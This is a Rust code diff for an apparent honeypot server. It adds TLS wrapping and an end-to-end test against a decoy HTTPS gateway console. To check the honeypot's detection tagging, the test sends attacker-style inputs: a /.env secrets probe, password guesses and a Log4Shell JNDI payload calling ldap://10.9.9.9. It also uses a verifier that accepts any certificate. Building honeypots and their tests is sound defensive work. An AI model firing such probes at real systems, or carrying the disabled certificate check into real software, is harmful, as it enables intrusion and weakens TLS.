@@ -18,6 +18,8 @@ pub struct Settings {
     pub persona: Persona,
     /// Concurrent session cap.
     pub max_sessions: usize,
+    /// Wrap every connection in TLS before the plugin sees it.
+    pub tls: Option<Arc<hp_tls::Acceptor>>,
 }
 
 pub struct Server {
@@ -27,6 +29,7 @@ pub struct Server {
     limits: Limits,
     persona: Persona,
     permits: Arc<Semaphore>,
+    tls: Option<Arc<hp_tls::Acceptor>>,
 }
 
 impl Server {
@@ -43,6 +46,7 @@ impl Server {
             limits: settings.limits,
             persona: settings.persona,
             permits: Arc::new(Semaphore::new(settings.max_sessions)),
+            tls: settings.tls,
         })
     }
 
@@ -62,6 +66,20 @@ impl Server {
                 }
             }
         }
+    }
+
+    /// One session: the TLS layer (if configured), then the plugin. Both run
+    /// under the session's timeout and panic guard.
+    async fn run<S: AsyncStream + 'static>(
+        &self,
+        stream: S,
+        ctx: SessionCtx,
+    ) -> anyhow::Result<()> {
+        let stream: Box<dyn AsyncStream> = match &self.tls {
+            Some(tls) => tls.accept(stream, &ctx.log).await?,
+            None => Box::new(stream),
+        };
+        self.proto.handle(stream, ctx).await
     }
 
     fn spawn_session<S: AsyncStream + 'static>(self: Arc<Self>, stream: S, peer: SocketAddr) {
@@ -85,7 +103,7 @@ impl Server {
         tokio::spawn(async move {
             let _permit = permit;
             log.event(Record::Connect);
-            let run = AssertUnwindSafe(self.proto.handle(Box::new(stream), ctx)).catch_unwind();
+            let run = AssertUnwindSafe(self.run(stream, ctx)).catch_unwind();
             match tokio::time::timeout(self.limits.session_timeout, run).await {
                 Err(_) => log.event(Record::Timeout),
                 Ok(Err(_)) => log.event(Record::Panic),
@@ -180,6 +198,7 @@ mod tests {
             limits,
             persona,
             max_sessions,
+            tls: None,
         };
         let server = Server::new(proto, behavior, sink, settings);
         let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
@@ -496,6 +515,183 @@ states:
             "typed input was logged: {kinds:?}"
         );
         assert!(!kinds.iter().any(|k| k == "error"), "{kinds:?}");
+    }
+
+    /// Accepts any certificate, as scanners do.
+    #[derive(Debug)]
+    struct AnyCert(Arc<rustls::crypto::CryptoProvider>);
+    impl rustls::client::danger::ServerCertVerifier for AnyCert {
+        fn verify_server_cert(
+            &self,
+            _: &rustls::pki_types::CertificateDer<'_>,
+            _: &[rustls::pki_types::CertificateDer<'_>],
+            _: &rustls::pki_types::ServerName<'_>,
+            _: &[u8],
+            _: rustls::pki_types::UnixTime,
+        ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
+            Ok(rustls::client::danger::ServerCertVerified::assertion())
+        }
+        fn verify_tls12_signature(
+            &self,
+            _: &[u8],
+            _: &rustls::pki_types::CertificateDer<'_>,
+            _: &rustls::DigitallySignedStruct,
+        ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
+            Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+        }
+        fn verify_tls13_signature(
+            &self,
+            _: &[u8],
+            _: &rustls::pki_types::CertificateDer<'_>,
+            _: &rustls::DigitallySignedStruct,
+        ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
+            Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+        }
+        fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
+            self.0.signature_verification_algorithms.supported_schemes()
+        }
+    }
+
+    /// The shipped HTTP track, through the real HTTP plugin behind the TLS
+    /// layer, over a socket, with a real TLS client: the hello is
+    /// fingerprinted, two logins fail, the third gets a session cookie that
+    /// opens the console, and the probes along the way are flagged.
+    #[tokio::test]
+    async fn example_https_track_end_to_end() {
+        let yaml = include_str!("../../../tracks/http-ops-portal.yaml")
+            .replace("600ms..1200ms", "1ms")
+            .replace("delay: 400ms", "delay: 1ms");
+        let track = hp_track::Track::from_yaml(&yaml).unwrap();
+        let tls = hp_tls::Acceptor::new(&hp_tls::CertSource::SelfSigned {
+            names: vec!["plc-gw-03".into()],
+            organization: None,
+        })
+        .unwrap();
+        let (sink, mut rx) = LogSink::channel(256);
+        let settings = Settings {
+            limits: Limits {
+                session_timeout: LONG,
+                max_input_bytes: 1 << 20,
+            },
+            persona: Persona {
+                hostname: None,
+                banner: Some("nginx/1.18.0 (Ubuntu)".into()),
+            },
+            max_sessions: 4,
+            tls: Some(Arc::new(tls)),
+        };
+        let server = Server::new(
+            Arc::new(hp_proto_http::Http),
+            Arc::new(TrackFactory::new(track)),
+            sink,
+            settings,
+        );
+        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(server.serve(listener));
+
+        let provider = Arc::new(rustls::crypto::ring::default_provider());
+        let config = rustls::ClientConfig::builder_with_provider(provider.clone())
+            .with_safe_default_protocol_versions()
+            .unwrap()
+            .dangerous()
+            .with_custom_certificate_verifier(Arc::new(AnyCert(provider)))
+            .with_no_client_auth();
+        let connector = tokio_rustls::TlsConnector::from(Arc::new(config));
+        let tcp = TcpStream::connect(addr).await.unwrap();
+        let name = rustls::pki_types::ServerName::try_from("plc-gw-03").unwrap();
+        let mut tls = connector.connect(name, tcp).await.unwrap();
+
+        let login = |pw: &str| {
+            let body = format!("username=admin&password={pw}");
+            format!(
+                "POST /login HTTP/1.1\r\nHost: plc-gw-03\r\n\
+                 Content-Type: application/x-www-form-urlencoded\r\n\
+                 Content-Length: {}\r\n\r\n{body}",
+                body.len()
+            )
+        };
+        let mut script = String::from("GET / HTTP/1.1\r\nHost: plc-gw-03\r\n\r\n");
+        script += "GET /.env HTTP/1.1\r\nHost: plc-gw-03\r\n\r\n";
+        script += &login("admin");
+        script += &login("password");
+        script += &login("Winter2025!");
+        script += "GET /dashboard HTTP/1.1\r\nHost: plc-gw-03\r\n\
+                   Cookie: GWSESSID=a81f03c2e4b7d9165c0e\r\n\r\n";
+        script += "GET /dashboard/overview HTTP/1.1\r\nHost: plc-gw-03\r\n\
+                   User-Agent: ${jndi:ldap://10.9.9.9/a}\r\nConnection: close\r\n\r\n";
+        tls.write_all(script.as_bytes()).await.unwrap();
+        let mut got = vec![];
+        tls.read_to_end(&mut got).await.unwrap();
+        let got = String::from_utf8(got).unwrap();
+        let statuses: Vec<&str> = got.lines().filter(|l| l.starts_with("HTTP/1.1 ")).collect();
+        assert_eq!(
+            statuses,
+            [
+                "HTTP/1.1 200 OK",
+                "HTTP/1.1 200 OK",
+                "HTTP/1.1 200 OK",
+                "HTTP/1.1 200 OK",
+                "HTTP/1.1 302 Found",
+                "HTTP/1.1 200 OK",
+                "HTTP/1.1 400 Bad Request",
+            ],
+            "{got}"
+        );
+        assert!(got.contains("Gateway Management Console"));
+        assert!(got.contains("DB_PASSWORD=Gw!c0ns0le-2023"));
+        assert_eq!(got.matches("Invalid username or password.").count(), 2);
+        assert!(got.contains("Location: /dashboard\r\n"));
+        assert!(got.contains("<h2>Overview</h2>"));
+        assert!(got.contains("Server: nginx/1.18.0 (Ubuntu)\r\n"));
+
+        let mut recs = vec![];
+        loop {
+            let line = tokio::time::timeout(Duration::from_secs(5), rx.recv())
+                .await
+                .expect("timed out")
+                .unwrap();
+            let v: Value = serde_json::from_str(&line).unwrap();
+            let done = v["kind"] == "disconnect";
+            recs.push(v);
+            if done {
+                break;
+            }
+        }
+        let of = |k: &str| recs.iter().filter(|r| r["kind"] == k).collect::<Vec<_>>();
+        let hello = of("tls_client_hello");
+        assert_eq!(hello.len(), 1);
+        assert_eq!(hello[0]["sni"], "plc-gw-03");
+        assert!(hello[0]["ja4"].as_str().unwrap().starts_with("t13d"));
+        assert_eq!(of("http_request").len(), 7);
+        let auth = of("auth");
+        assert_eq!(auth.len(), 3);
+        assert_eq!(auth[2]["credential"], "Winter2025!");
+        assert_eq!(auth[2]["method"], "http_form");
+        assert_eq!(
+            (&auth[0]["accepted"], &auth[2]["accepted"]),
+            (&serde_json::json!(false), &serde_json::json!(true))
+        );
+        let tags: Vec<&str> = of("tag")
+            .iter()
+            .map(|t| t["tag"].as_str().unwrap())
+            .collect();
+        assert_eq!(
+            tags,
+            [
+                "secrets_probe",
+                "login_attempt",
+                "login_attempt",
+                "auth_success",
+                "console_access",
+                "log4shell_attempt"
+            ]
+        );
+        assert_eq!(
+            of("behavior_error").len() + of("error").len(),
+            0,
+            "{recs:?}"
+        );
     }
 
     #[tokio::test]
